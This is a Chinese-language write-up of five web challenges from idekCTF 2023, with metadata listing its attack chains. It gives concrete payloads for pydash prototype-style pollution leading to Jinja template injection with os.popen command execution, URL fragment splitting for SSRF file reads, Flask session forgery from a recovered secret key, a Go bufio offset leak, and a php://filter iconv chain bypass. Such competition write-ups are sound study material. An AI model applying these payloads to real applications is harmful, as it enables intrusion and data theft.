---
title: 2023 idekCTF WriteUp
contest: idekCTF 2023
year: 2023
difficulty: hard
vuln_type: web_unknown
tags: [pydash原型链污染, Jinja2全局变量劫持, urllib拆fragment, flask_unsign伪造session, Go_bufio_Race, php_filter_chain, nginx缓存绕过]
attack_chain:
  - TaskManager: pydash.set_ 走 __init__.__globals__ 链污染 app.env / jinja_env.globals.value
  - 改 jinja_env.variable_start_string/[[:成 '']:，闭合 jinja 模板表达式
  - GET /../../usr/local/lib/python3.8/turtle.py 触发 SSTF 读 /flag-*.txt
  - Subscription: requests/urllib3 _splittag 用 %23 切 fragment 拆分 URL
  - 代理层 http://proxy/proxy/file:///flag.txt%23/../../../static/a 双层 URL 穿越
  - free_flag_news: 注册/登录/上传 zip 触发 unzip 软链读 /tmp/server.log
  - log 时间戳 + config.py SECRET_OFFSET 还原 random.seed
  - flask_unsign.sign 伪造 session.admin=True 拿 /flag
  - just-read-it: Go bufio.NewReader 在 size>=100 包裹，套娃调用 Read 移动 reader 指针 32 字节对齐
  - Order=32 + bufio 边界读 32 字节比较 password
  - idek newsPHPaper: php://filter 多重 iconv 链预置 FREE 头部绕过 strpos === 0 检测
key_payload: 'php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|...|convert.base64-decode/resource=flag'
one_liner: 5 道高质量 Web：pydash 链污染+urllib fragment 拆分+flask session 伪+Go bufio 越界+php filter chain 预置 FREE。
lesson: pydash.set_ 走 Python 属性路径可污染 Flask jinja_env；urllib _splittag 用 %23 切 URL 绕过 SSRF 检查；flask SECRET_KEY 靠 random.seed(time+offset) 可还原；Go bufio 包装是经典套娃越界；php://filter iconv 链可前置任意字符串。
quality: high
---

# 2023 idekCTF WriteUp

## 来源
- 原文：ctfiot.com/92876.html
- 比赛：idekCTF 2023

## 5 道 Web 详解

### 1. TaskManager（pydash 属性链污染）
```python
class TaskManager:
    protected = ["set", "get", "get_all", "__init__", "complete"]
    def set(self, task, status):
        if task in self.protected: return
        pydash.set_(self, task, status)  # 任意属性写入
        return True
```
- 黑名单只挡 set/get/...，不挡 `__init__`
- 链：`__init__.__globals__.__spec__.loader.__init__.__globals__.sys.modules.__main__.app.jinja_env.globals.value`
- payload 1：污染 `app.env = "yolo"` 触发 before_first_request
- payload 2：污染 `jinja_env.globals.value = "__import__('os').popen('cat /flag-*.txt').read()"`
- payload 3-4：污染 `jinja_env.variable_start_string = "'']:\n value = "` +  `variable_end_string = "\n"`
- 闭合 jinja 表达式：`GET /../../usr/local/lib/python3.8/turtle.py` 触发 SSTI

### 2. Subscription（urllib fragment 拆分 + nginx 缓存）
- `_splittag` 用 `rpartition('#')` 拆 URL，fragment 不参与请求
- payload：`http://127.0.0.1:1337/proxy/file%3a///flag.txt%2523/../../../static/a`
- 内层 proxy 收到 `file:///flag.txt%23/../../../static/a`，urllib 拆 `file:///flag.txt` + `../../../static/a`
- 外层 proxy 缓存 `/static/...` 路径穿越到 `/flag.txt`

### 3. free_flag_news（flask session 伪造）
- 上传 zip 自动 unzip 到 `/uploads/{uuid}/`
- 用软链 `server.log -> /tmp/server.log` 触发 Path 解析
- log 头行 `[{asctime}]` 拿服务启动时间戳
- `config.py` 暴露 `SECRET_OFFSET`
- 还原 `random.seed(time*1000 + SECRET_OFFSET)` → 算 SECRET_KEY
- `flask_unsign.sign({admin: True, uid: 'yyds'}, SECRET_KEY)` 伪造 session
- `GET /flag` 拿 flag

### 4. just-read-it（Go bufio 套娃越界）
```go
func GetValidatorCtxData(ctx context.Context) (io.Reader, int) {
    reader := ctx.Value(reqValReaderKey).(io.Reader)
    size := ctx.Value(reqValSizeKey).(int)
    if size >= 100 {
        reader = bufio.NewReader(reader)  // 关键：>=100 时包 bufio
    }
    return reader, size
}
```
- 正常 read 每次 size <= 100 → 无 bufio
- Validate 调 `v.Read(WithValidatorCtx(ctx, r, 32))` → size=32 → 无 bufio
- 但 `initRandomData` 把 password 复制到 `randomData[12625:]`
- 反复 `Read(ctx, 32)` 把 reader 指针推到 12625 附近，再读 32 字节到 password
- 巧妙组合 Orders 数组让 bufio 跨越 12625 偏移拿到 password

### 5. idek newsPHPaper（php://filter 链预置字符串）
- 入口：`?p=...` 走 `file_get_contents` + `strpos === 'FREE'`
- 需要文件以 `FREE ` 开头
- 用 `php_filter_chain_generator.py` 生成多重 iconv 链：
  ```
  convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|...|convert.base64-decode/resource=flag
  ```
- 链结果前缀 `FREE ` 绕过 strpos 检测

## 关键技巧
- **pydash 属性路径**：可用 `.` 走 Python 任意属性，等同 `__import__` 链污染
- **urllib fragment 拆分**：用 `%23` 在 URL 末切，绕过 `urlopen` 主机名检查
- **flask SECRET_KEY 还原**：random.seed(time) 是常见坑，可从 log 时间戳恢复
- **Go bufio 边界**：size >= 100 触发 bufio 包装是关键边界
- **php://filter iconv 链**：用 iconv + base64 双重叠加前置任意字节

## 适用场景
- Python Web 属性污染
- SSRF 协议层 + URL 解析差异
- Flask session 伪造
- Go 上下文 + Reader 指针
- PHP LFI 字符串前置
